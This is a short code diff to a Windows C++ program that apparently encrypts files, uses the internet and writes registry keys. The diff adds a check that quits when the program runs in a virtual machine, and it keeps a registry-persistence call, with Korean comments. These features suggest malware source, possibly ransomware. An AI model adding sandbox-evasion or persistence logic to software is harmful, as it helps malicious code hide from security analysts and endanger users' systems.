@@ -13,6 +13,7 @@
 #include "fileEnc.hpp"
 #include "internet.hpp"
 #include "registry.hpp"
+#include "sys.hpp"
 
 using namespace std;
 
@@ -28,6 +29,11 @@ HWND hEdit;
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
+    // 가상머신에서 동작중인지 확인
+    if (checkVirtualEnvironment()) {
+        cout << "virtual environment." << endl;
+        exit(0);
+    }
 
     // 레지스트리 키 등록
     SaveReg();
